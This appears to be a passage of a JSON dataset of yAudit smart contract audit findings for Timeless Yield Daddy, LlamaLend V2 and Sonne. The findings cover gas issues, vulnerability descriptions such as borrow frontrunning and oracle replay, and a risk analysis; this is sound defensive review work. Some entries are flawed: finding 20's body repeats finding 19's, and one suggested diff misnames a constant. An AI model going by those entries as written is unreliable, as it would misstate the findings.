            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Remove unnecessary approve",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "This approve() call is designed to initialize the storage slot to a non-zero value in order to save gas on future changes of this slot. The problem is that the approve() call that happens before each swap overwrites the initial allowance value, which is subsequently consumed by the Curve swap and re-set to zero.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Unnecessary logic in approveMaxIfNeeded() function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The contracts that call approveMaxIfNeeded() include Swapper.sol and CurveV2Swapper.sol. No other approve() or safeApprove() calls happen in these contracts, so the only allowance being set is an allowance of type(uint256).max. If the allowance is set to type(int256).max, USDT will not decrease the allowance when a transfer happens. So the process of checking the allowance and setting it to zero if the value is not type(int256).max is unnecessary and can be replaced with a simple token.safeApprove(spender, type(uint256).max); call. There might be an edge case other than USDT that the approveMaxIfNeeded() was designed for, but the function should not be necessary for USDT or standard ERC20 tokens.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Direct transfer of aTokens impacts share value",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "function totalAssets() public view virtual override returns (uint256) { // aTokens use rebasing to accrue interest, so the total assets is just the aToken balance return aToken.balanceOf(address(this)); } The totalAssets() function in AaveV2ERC4626.sol and AaveV3ERC4626.sol is an important function. It is called in the calculations of convertToShares(), convertToAssets(), previewMint(), and previewWithdraw(). It is possible for anyone to transfer Aave aTokens directly to the vault, which would change the value returned by totalAssets(). Although such an increase in value happens normally as deposits take place or yield is earned, an instantaneous change may impact how other protocols interface with Yield Daddy ERC4626 tokens depending on how the other protocols are implemented. This comment is absent from the Compound ERC4626 wrapper, but the same edge case of a user sending tokens directly to the vault can apply.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. aAMPL edge cases",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "AMPL is a rebasing token, but unlike Aave aTokens, AMPL can increase or decrease the balance that user's hold. This website shows some recent rebasing activity in both the positive and negative directions. The ability to rebalance in either direction means that a user depositing into the Yield Daddy aAMPL vault may receive less tokens when withdrawing than when they deposited. If there are very few depositors in the aAMPL vault, a user with a large fraction of vault ownership may be able to take advantage of the timing of the AMPL rebasing (which happens once per day) at the cost of the other vault shareholders.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Invert constant mask variables",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "Modify the constant masks in the Aave V3 wrapper to the following: - uint256 internal constant DECIMALS_MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFFFFFF; + uint256 internal constant DECIMALS_MASK = 0xFF << 48; - uint256 internal constant ACTIVE_MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFF; + uint256 internal constant ACTIVE_MASK = 1 << 56; - uint256 internal constant FROZEN_MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFFFFFFFFFF; + uint256 internal constant FROZEN_MASK = 1 << 57; - uint256 internal constant PAUSED_MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFF; + uint256 internal constant PAUSED_MASK = 1 << 60; - uint256 internal constant SUPPLY_CAP_MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFF000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFF; + uint256 internal constant PAUSED_MASK = 0xFFFFFFFFF << 116; Remember to remove the negation where the variables are used, so ~DECIMALS_MASK will become DECIMALS_MASK.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Simplify logic in maxDeposit() and maxMint()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "maxDeposit() and maxMint() have logic which can be simplified: - if (!(_getActive(configData) && !_getFrozen(configData) && !_getPaused(configData))) { + if (!_getActive(configData) || _getFrozen(configData) || _getPaused(configData)) {",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Add parentheses to avoid order of operations ambiguity",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "These three functions have boolean logic that relies on order of operations. If this changes in a future solidity version, an incorrect value may be calculated. Applying parentheses would remove any ambiguity and make it easier to upgrade to future solidity releases with reduced concerns. function _getActive(uint256 configData) internal pure returns (bool) { - return configData & ~ACTIVE_MASK != 0; + return (configData & ~ACTIVE_MASK) != 0; } function _getFrozen(uint256 configData) internal pure returns (bool) { - return configData & ~FROZEN_MASK != 0; + return (configData & ~FROZEN_MASK) != 0; } function _getPaused(uint256 configData) internal pure returns (bool) { - return configData & ~PAUSED_MASK != 0; + return (configData & ~PAUSED_MASK) != 0; }",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. Inconsistent ERC4626 callback usage",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The default withdraw() and redeem() function implementations are overridden in AaveV2ERC4626.sol, possibly to save gas from one ERC20 token transfer. The same approach could be used for deposit() and mint() by having the user send their reserve asset directly to Aave with an onBehalfOf value in the deposit() call of the Yield Daddy vault. This may require the user to approval the Aave pool, but it would improve consistency in the Yield Daddy code.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Some hard coded variables might be better adjustable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The rewardRecipient is an address that receives accrued rewards from the ERC4626 vault. This address cannot be changed in the existing AaveV2ERC4626.sol contract. Scenarios may arise where this value needs to be changed, but the contract does not currently allow this to happen.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. Unclear upgrade mechanism",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The Yield Daddy contracts have no clear upgrade mechanism even though some hard coded values might need changing in the future. Some examples of upgrade use cases include: If extra features are planned for a future Yield Daddy vault version, there is no clear path for migrating the aTokens from the existing vault. The Yield Daddy vaults do not have a mechanism to borrow from Aave using the aTokens the vault holds. Borrowing with some amount of this collateral could allow Yield Daddy to increase the yield generated and improve the value proposition to users. Introducing such a mechanism in the future would require the vault to approve the aTokens to another address or borrowing directly from Aave, and neither option is available with the contract logic. Aave had a referral program in the past which is now inactive, and a governance proposal could theoretically bring the program back. Even though this scenario is unlikely, if it were to happen the Aave deposit() call in Yield Daddy has a hard coded value of 0 for the referral code, so no referral rewards could be collected if the reward program is resumed by Aave.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. General lack of documentation and comments",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "To give one example of some unclear code that should have comments, the maxRedeem() function checks how much of the reserve asset is held by the aToken address. It may not be obvious to all readers that the reason that an external protocol is queried before returning a result for Yield Daddy users is to cover the edge case where the Aave pool is undercollateralized (which is common due to Aave's lending feature) and the Yield Daddy withdrawal would be larger than the entire Aave aToken reserve balance. A comment in the code or developer docs explaining this reasoning could expedite understanding for developers interfacing with this protocol or future code reviewers. Another place where NetSpec comments would help is clarifying that the return value of maxWithdraw() is in units of shares while the return value of maxRedeem() is in units of the underlying asset.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Typos",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The Aave V2 factory contract has a comment accidentally copied from Aave V3. This should be modified to reference Aave V2. This comment about burn the xPYT should be removed or changed. It was erroneously copied from a similar function that does burn xPYT. The same applieds to this other comment in the same function.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39. Aave LendingPool getConfiguration() can replace getReserveData()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "getReserveData() returns many pieces of data in Aave V2 and Aave V3. The only data needed in the wrapper contracts can be received from getConfiguration(), which returns less data in Aave V2 and Aave V3. This efficiency boost won't save gas because it is used in a view function.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "40. Redundant dependency imports",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The ERC4626 factory contracts have the same redundant import of two solmate files. For example, Aave V3 imports ERC4626Factory.sol and two solmate files. But the imported base factory contract has the solmate files imported, making the import of these files redundant. StETHERC4626.sol has a similar instance of this where StETHERC4626.sol imports \"solmate/tokens/ERC20.sol\" and \"./external/IStETH.sol\", but \"solmate/tokens/ERC20.sol\" is already imported by IStETH.sol making the separate import unnecessary. CurveV2Swapper.sol has a similar instance of this where CurveV2Swapper.sol imports \"../Swapper.sol\" and \"../lib/ApproveMaxIfNeeded.sol\", but \"../lib/ApproveMaxIfNeeded.sol\" is already imported by Swapper.sol. The same applies to the solmate and timeless imports in CurveV2Swapper.sol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "41. Interface doesn't match mainnet contract",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "This is the Compound code defining the mintGuardianPaused mapping as mapping(address => bool) public mintGuardianPaused. The interface for this mapping is defined as function mintGuardianPaused(ICERC20 cToken) external view returns (bool). This is problematic because the address type is not equal to the ICERC20 type. A foundry test was created to test if this type mismatch caused a revert, but the test passed without a revert. However, the custom maxMint() and maxDeposit() functions are not tested with existing tests for Compound or Aave V3.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "42. Consider upgrade to latest solidity release",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The release notes of solidity releases since 0.8.13 describe code generation bugfixes and gas optimizations that have been introduced in the more recent releases. It would be best to use the latest release unless there is a good reason to continue using 0.8.13.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "43. Theoretical overflow of convertToShares() and convertToAssets()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "Below is the custom convertToShares() function from StETHERC4626.sol: function convertToShares(uint256 assets) public view virtual override returns (uint256) { uint256 supply = stETH().totalSupply(); return supply == 0 ? assets : assets.mulDivDown(stETH().getTotalShares(), supply); } If the value of the assets input parameter or the value of stETH().getTotalShares() is very close to type(uint256).max at the same time that supply is a very small value, this function could revert during the mulDivDown library call. The same is true of the convertToShares() function in the standard solmate implementation. The convertToAssets() function suffers from the same side effect in this extreme case.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "44. No zero address checks in constructor",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The xPYT.sol constructor sets three state variables to specific external contract addresses. No zero address check is performed, making it possible that one of these state variables could be set to the zero address.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "45. Modify Gate.sol claimYieldAndEnter() function argument",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "Most locations where xPYT is used, it is cast to an address with address(xPYT). Only once is it used as IxPYT type. Instead, take in a function argument of type address and cast to IxPYT the one time that this type is needed.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "46. CurveV2xPYT utilizes a non-TWAP price oracle",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "Curve's price_oracle() implementation uses an exponential moving average for its oracle. EMA oracles have different properties from TWAP oracles, most notable of which is they are more sensitive to high price volatility near the time of query.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "47. Replace magic numbers with constants",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "There are many instances of the value 10000. Consider replacing this magic number with a constant internal variable named FEE_BASE. Instances are found here, here, here, and here.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "48. No timelock or other protection around changing fee or fee recipient",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "ownerSetProtocolFee() allows the owner to set the fee percentage and fee recipient. While this function has access control to only allow the owner to call this function, there is no further controls to reduce centralization risk. Whether this is necessary depends on the parties who are intended to receive the fees. If users are intended to receive a fraction of the fees from Swapper.sol, they may want additional guarantees that the fees will not be redirected somewhere else without notice.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "49. safeApprove is deprecated",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "This function is deprecated because it can be used to manipulate a user's allowances using specific transaction ordering.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "50. Swapper repo foundry coverage failing",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "While increasing code coverage does not necessarily reduce the risk of security issues, it is generally a good idea to improve code coverage for projects. Running foundry coverage in the swapper repo returns a CompilerError: Stack too deep when compiling inline assembly: Variable value0 is 1 slot(s) too deep inside the stack. error. This implies that code coverage is not being monitored or improved for the swapper issue.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "51. StETHERC4626.t.sol test failing",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "This issue is caused by the mintUnderlying call on line 188, which mints 1e18+2 of the underlying token for alice. 1e18 of these tokens are deposited to the vault on line 201, leaving behind 2 underlying tokens in alice's account when the following assertion is made on line 205.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. createPool() always reverts",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "LLamalendFactory.createPool() sends ether to the LendingPool contract: payable(address(pool)).sendValue(msg.value); Since the LendingPool contract doesn't have a receive() function, this transfer reverts, in turn reverting createPool().",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Frontrunning borrow changes borrower's interest rate",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "The LlamaLend protocol calculates the interest rate of a loan in calculateInterest(). The rate curve is a linear 1-piece curve (unlike protocols like Aave that use a 2-part curve, with a steeper slope after a certain amount of borrowing). The interest rate for a loan is fixed, not variable like many other lending protocols where the rate depends on the total amount borrowed. To determine the fixed rate, LlamaLend uses the midpoint between the current borrowed amount of the new borrowed amount after the borrow action is complete. This calculation is in line 98. This introduces dependency on the amount borrowed at the time of the loan, or totalBorrowed. Frontrunning a borrow with another borrow can change the value of totalBorrowed.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. No support for cryptopunks",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "Cryptopunks are at the core of the NFT ecosystem. As one of the first NFTs, it embodies the culture of NFT marketplaces. But cryptopunks does not adhere to the ERC721 standard, that limits the contract ability to accept cryptopunks as collateral.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. baseURI can be made a modifiable state variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "LendingPool.tokenURI() uses this baseURI: string private constant baseURI = \"https://nft.llamalend.com/nft2/\"; This is a constant variable and if access to https://nft.llamalend.com/nft2/ is lost, tokenURI() will start returning an inaccessible URI.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Consider removing LlamaLendFactory.receive()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "There is no need to send ether to LlamaLendFactory contract explicitly, so receive() can be removed, but even if someone sends ETH by mistake to the contract address, any one can extract them by passing empty data to repay.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. calculateInterest() does not account for pending interest payments",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "When a pool has an outstanding borrowed amount, there is a corresponding amount of interest that is expected to be paid in the future. When the interest is calculated for new loans, the total value of the pool is calculated as the current pool balance plus the amount of value borrowed, which is the denominator in the calculation of variableRate. This total value does not consider the pending interest payments that are due. The result is that the total pool balance is slightly underestimated. While the existing approach of ignoring future interest payments until they are paid may have some benefit, it creates a discontinuity where the total assets held by the pool before and after a user calls repay() results in an immediate increase in pool assets.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Risk of bad debt",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "The README in the LlamaLend repository has this line in the \"Risks for LPs\" section You are selling put options on NFTs, if NFT price drops >66% before some loan expires, user will likely not repay and you'll get the NFT at a loss. Lending protocols like Aave and Compound have liquidation policies that limit the amount of bad debt that can accumulate in the protocol. This is no such protection in LlamaLend, so liquidation is only possible after loan.deadline regardless of how much bad debt accumulates. The LlamaLend README suggest a maxLoanLength value of 2 weeks will be used, but this is not hardcoded into the contracts, meaning that a longer deadline could increase the risk of bad debt and loss of value for the lender.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Oracle data replay attack",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "There is no requirement in checkOracle() that only the latest oracle data can be used. Instead, there is a deadline and any oracle data in the timeframe allowed by deadline is accepted. A user can look at the data from the last 20 minutes and choose the oracle data with a price that is most beneficial to them. This lets users \"turn back to clock\" if they don't like the latest data that the oracle is returning. This means that the oracle must be sure not to return a zero value or underestimated value for the NFT floor price in any edge case scenario, such as before the NFT floor price data is available. For comparison, when Chainlink oracle data is used, it is normally recommended to use only the latest round of oracle data, which removes the ability for a user to choose which datapoint among recent data to use.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. NFT can get locked in contract if from is a smart contract",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "User will receive the collateral NFT when repay() is called. However, if from is a contract address that does not support ERC721, the collateral NFT can be frozen in the contract. As per EIP-721: \"A wallet/broker/auction application MUST implement the wallet interface if it will accept safe transfers.\" function _repay(Loan calldata loan, address from) internal returns (uint256) { ... IERC721(loan.nftContract).transferFrom(address(this), from, loan.nft); ... }",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Use custom errors",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "Custom errors are more gas efficient than error strings.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Variables are auto-initialized to 0",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "LendingPool.sol#L277-L279 creates an else clause to assign 0 to a return value which is already 0: } else { lateFees = 0; }",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Extra event is emitted by _burnWithoutBalanceChanges()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "In a normal _burn() function, only a Transfer event is emitted. _burnWithoutBalanceChanges() emits 2 events: Transfer and Approval. The reason being it calls _approve() to clear approval, but _burn() function just deletes _tokenApprovals mapping.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Use unchecked if no underflow risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "Because lastUpdateDailyBorrows is only modified by setting the variable equal to block.timestamp, block.timestamp - lastUpdateDailyBorrows can never underflow. This line and this line can be unchecked. The same logic applies to loan.startTime so this line can be unchecked.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. factory can be marked as immutable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "Since there is no function in the contract that updates the factory variable address, it can be marked as immutable.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Foundry and hardhat tests not working",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "Hardhat and Foundry tests are not working as they refer to non-existent contracts and variables, or call functions with different number of arguments.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. _burnWithoutBalanceChanges() shadows owner",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "The second argument in _burnWithoutBalanceChanges(tokenId, owner) shadows the global variable owner.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Consider allowing anyone to repay any loan",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "LendingPool.sol#L203, LendingPool.sol#L169",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Update OpenZeppelin dependencies",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "The package.json file shows a dependency of openzeppelin/contracts v4.2.0 and openzeppelin/contracts-upgradeable v4.8.0-rc1. All dependencies should be updated to the latest version available.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Flashloans are free",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "The interest due on a loan is calculated in _repay() and infoToRepayLoan(). The interest due for a flashloan is zero, meaning there is no fee for this borrowing operation. Whether this is intentional is unclear.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Interest rate \"renegotiation\" after a repayment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "The interest due on a loan is calculated in _repay() and infoToRepayLoan(). The interest due for a flashloan is zero, meaning there is no fee for this borrowing operation. Whether this is intentional is unclear.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Inaccurate comment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "The word overflow in this comment that reads \"overflow checks implictly check that amount is enough\" should be changed underflow.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Align _burnWithoutBalanceChanges() with _burn()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "Although it does not change the end result, the following change in _burnWithoutBalanceChanges() can be made to use the same approach as _burn() - _approve(address(0), tokenId); + delete _tokenApprovals[tokenId];",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Missing events for critical operations",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Ideally, the following critical operations should trigger events: withdraw() setMaxDailyBorrows() setOracle() emergencyShutdown() doEffectiveAltruism()",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Revert operation performed without proper error message",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md",
        "body": "For ex: In function borrow() it checks that current interest rate should be less than maximumInterestRate, but it does not revert with error message, which can be confusing to use, as error message helps to understand the reason why transaction failed. function borrow() { ... require(interest <= maxInterest); ... }",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Sonne market parameters have a high risk profile",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "In summary, the collateral limits set by Sonne are unusually high in certain markets. Additionally, the overall amount of borrowed assets in Sonne compared to the total assets deposited is also very high. The combination of these factors indicates that Sonne is at risk of collecting bad debt and may not be in a position to pay off this bad debt, which could permanently impact the protocol's reputation. For a first data point, Sonne collateral parameters can be compared to Compound Finance v2, Aave v2 Ethereum, and Aave v3 Optimism market parameters. The table below shows the collateral and reserve parameters for the different underlying assets. | TOKEN | Sonne Collateral Factor | Compound Collateral Factor | Aave v2 Collateral Factor | Aave v3 Optimism Collateral Factor | Sonne Reserve Factor | Compound Reserve Factor | Aave v2 Reserve Factor | Aave v3 Optimism Reserve Factor | | ------ | ----------------------- | -------------------------- | ------------------------- | ---------------------------------- | -------------------- | ----------------------- | ---------------------- | ------------------------------- | | OP | 65% | | | 30.00% | 20% | | | | | USDC | 90% | 85.50% | 80.00% | 80.00% | 10% | 7.50% | 10.00% | 10.00% | | USDT | 90% | 0.00% | 0.00% | 75.00% | 10% | 7.50% | 10.00% | 10.00% | | DAI | 90% | 83.50% | 75.00% | 78.00% | 10% | 15.00% | 10.00% | 10.00% | | sUSD | 60% | | 0.00% | 60.00% | 20% | | 20.00% | | | wETH | 75% | 82.50% | 82.50% | 80.00% | 15% | 20.00% | 15.00% | 15.00% | | SNX | 45% | | 46.00% | | 27% | | 35.00% | | | wBTC | 70% | 70.00% | 72.00% | 73.00% | 20% | 20.00% | 20.00% | 20.00% | | LUSD | 60% | | 0.00% | 0.00% | 20% | | 10.00% | 10.00% | | wstETH | 60% | | 72.00% | 70.00% | 18% | | | 15.00% | Some of the most obvious cases where the Sonne choices differ from other protocols include: 90% USDT collateral factor (compared to 0%) 60% sUSD and LUSD collateral factors (compared to 0%) 75% WETH collateral factor (compared to 80%-82.5%) Aave and Compound have undergone extensive risk analysis as evidenced by their dashboards on Gauntlet's website (1, 2), Gauntlet risk assessment reports (1, 2), and regular governance proposals that modify the risk parameters according to market conditions (1, 2). Aave even disabled borrowing on many tokens in AIP-125 in Nov 2022 after an attack on the protocol caused an accumulation of bad debt. Some of the tokens that had borrowing disabled, including SNX (which exists on Sonne), have not yet reenabled borrowing. While Euler Finance decided to allow borrowing against USDT collateral, it is unclear if Euler Finance has undergone the same level of extensive risk modelling that Compound and Aave have. Comptroller has a hardcoded 90% collateralization factor limit, and because the liquidationIncentiveMantissa is 108%, this means that there is less than a 3% margin in price movement (100% - (108% * 90%) = 2.8%) for some markets before a partial liquidation of a position will push the entire position towards liquidation, as outlined by the \"Counterproductive Incentives\" high finding in this OpenZeppelin report. A second data point can be found by comparing the amount of assets lent and borrowed between different lending protocols. A specific focus was placed on comparing Sonne with other Compound forks (Venus, Tectonic, Benqi, Flux) for a more equal comparison. Note that Venus also has a Gauntlet dashboard. The results below show that Sonne is allowing a much higher amount of borrowing than other lending protocols, which means Sonne is at higher risk of accumulating bad debt than other lending protocols. The reason behind such high borrowing might be the added SONNE token incentives, but the specific borrowing interest rate curves may be another reason behind such high borrowing. | Protocol | Total assets ($M) | Borrowed ($M) | Borrowed percentage | | ---------------- | ----------------- | ------------- | ------------------- | | Sonne | 85 | 56 | 65.90% | | Compound v2 | 1770 | 539 | 30.50% | | Aave v2 Ethereum | 5130 | 1670 | 32.60% | | Aave v3 Optimism | 94 | 35 | 37.20% | | Venus | 1219 | 430 | 35.20% | | Tectonic | 194 | 69 | 35.60% | | Benqi | 151 | 36 | 23.80% | | Flux | 60 | 23 | 38.00% | A final data point that would be helpful to understand the risk for the Sonne protocol is a dashboard that shows liquidations or bad debt in Sonne. Sonne is not listed in the Risk DAO bad debt dashboard, but working with this team to add Sonne would be a good step forward. Creating a Dune dashboard for liquidations and accounts at risk of liquidation would also help. The very high borrowing on Sonne relative to underlying collateral indicates that users are taking higher risk positions in the protocol than other lending protocols. Monitoring should be in place to understand if bad debt is accumulating, as it did 